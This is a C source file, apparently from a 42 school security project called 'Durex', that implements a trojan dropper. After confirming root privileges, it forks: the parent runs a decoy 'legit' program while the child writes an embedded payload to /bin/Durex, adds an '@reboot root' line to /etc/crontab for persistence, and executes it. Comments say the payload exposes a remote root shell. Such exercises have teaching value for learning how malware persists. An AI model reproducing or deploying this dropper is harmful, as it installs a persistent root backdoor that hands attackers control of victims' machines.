/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/11/15 19:18:57 by bccyv             #+#    #+#             */
/*   Updated: 2021/11/15 19:48:27 by bccyv            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <durex.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

extern unsigned char stub[];
extern unsigned int stub_len;

/*
 * Writes @blen bytes of @bin file in @bpath.
 * Creates the file if it doesn't exists. Overrides it if it does.
*/
int write_binary(unsigned char *bin, unsigned int blen, const char *bpath)
{
	int fd;

	fd = open(bpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
	if (fd < 0)
		return (-1);

	write(fd, bin, blen);
	close(fd);

	return (0);
}

int add_crontab_entry(const char *cpath, const char *bpath)
{
	int fd;
	char *cmd;
	int ret;

	fd = open(cpath, O_RDWR | O_APPEND);
	if (fd < 0)
		return (-1);

	ret = ft_strnf(fd, bpath);
	if (ret == 0)
	{
		cmd = ft_strcat("@reboot root ", bpath);
		if (cmd == NULL)
		{
			close(fd);
			return (-1);
		}
		dprintf(fd, "%s\n", cmd);
	}

	close(fd);
	return (ret < 0 ? -1 : 0);
}

/*
 * This programm will start whatever legit software in the foreground (greed.c)
 * and a malicious code in the background. This malicious code will add
 * a binary in system binaries, and execute it as a daemon at each reboot.
 * This binary will expose a remote root shell.
*/
int main(void)
{
	int pid;

	// Check for root access rights.
	uid_t uid = getuid();
	if (uid != 0)
	{
		printf("Error: You need to be root in order to execute this program.\n");
		return (1);
	}

	pid = fork();
	if (pid < 0)
	{
		perror("Durex fork");
		fflush(stderr);
	}
	else if (pid > 0)
	{
		// Legit code
		greed();
	}
	else
	{
		/*
		 * Malicious code:
		 * 1. writes the payload (stub.c) in system binaries
		 * 2. adds a crontab entry to execute it at boot time
		 * 3. executes it manually a first time
		*/

		write_binary(stub, stub_len, "/bin/Durex");
		add_crontab_entry("/etc/crontab", "/bin/Durex");
		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
	}
	return (0);
}
